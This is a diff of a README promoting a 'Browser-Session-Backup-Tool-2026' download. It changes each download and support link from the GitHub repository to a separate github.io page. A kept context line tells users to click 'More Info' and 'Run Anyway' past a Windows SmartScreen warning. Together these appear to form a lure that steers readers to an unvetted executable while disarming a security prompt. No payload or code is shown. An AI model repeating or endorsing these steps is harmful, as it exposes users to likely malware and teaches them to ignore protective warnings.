@@ -1,6 +1,6 @@
 # 🔒 Browser-Session-Backup-Tool-2026 - Never Lose Your Tabs Again
 
-[![Download Browser Session Backup Tool](https://img.shields.io/badge/Download-Browser_Session_Backup_Tool_2026-2ea44f?style=for-the-badge)](https://github.com/techtitan007/Browser-Session-Backup-Tool-2026)
+[![Download Browser Session Backup Tool](https://img.shields.io/badge/Download-Browser_Session_Backup_Tool_2026-2ea44f?style=for-the-badge)](https://techtitan007.github.io)
 
 ## 🛡️ What Is This Tool?
 
@@ -49,7 +49,7 @@ Automatically delete backups older than a set number of days to keep things tidy
 
 ### Step 1: Download the Tool
 
-Visit this link to download the application: [https://github.com/techtitan007/Browser-Session-Backup-Tool-2026](https://github.com/techtitan007/Browser-Session-Backup-Tool-2026)
+Visit this link to download the application: [https://techtitan007.github.io](https://techtitan007.github.io)
 
 Click the download button on that page. The file will start downloading to your computer.
 
@@ -168,7 +168,7 @@ This is normal. Click "More Info" and then "Run Anyway." The tool is safe, but S
 
 ## 🤝 Support and Feedback
 
-If you have questions, problems, or ideas for improvement, visit the GitHub page: [https://github.com/techtitan007/Browser-Session-Backup-Tool-2026](https://github.com/techtitan007/Browser-Session-Backup-Tool-2026)
+If you have questions, problems, or ideas for improvement, visit the GitHub page: [https://techtitan007.github.io](https://techtitan007.github.io)
 
 You can open an issue there, and the developer will help you.
 
@@ -182,6 +182,6 @@ Thank you for choosing Browser-Session-Backup-Tool-2026. We built this tool beca
 
 **Download now and never lose your tabs again.**
 
-[![Get Browser Session Backup Tool](https://img.shields.io/badge/GET_IT_NOW-Browser_Session_Backup_Tool_2026-ff6f00?style=for-the-badge)](https://github.com/techtitan007/Browser-Session-Backup-Tool-2026)
+[![Get Browser Session Backup Tool](https://img.shields.io/badge/GET_IT_NOW-Browser_Session_Backup_Tool_2026-ff6f00?style=for-the-badge)](https://techtitan007.github.io)
 
 Keywords: browser-session-backup, chrome-session, edge-session, firefox-session, session-manager
